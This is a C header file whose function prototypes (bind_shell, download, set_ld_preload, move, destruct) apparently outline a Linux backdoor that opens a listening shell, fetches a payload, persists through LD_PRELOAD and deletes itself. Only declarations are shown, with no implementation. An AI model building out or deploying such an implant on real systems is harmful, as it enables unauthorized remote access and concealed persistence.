#pragma once

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <pthread.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>

void bind_shell();
int is_downloaded();
int download();
void *handle_client(void *arg);
int set_ld_preload();
int move(char *path);
void destruct();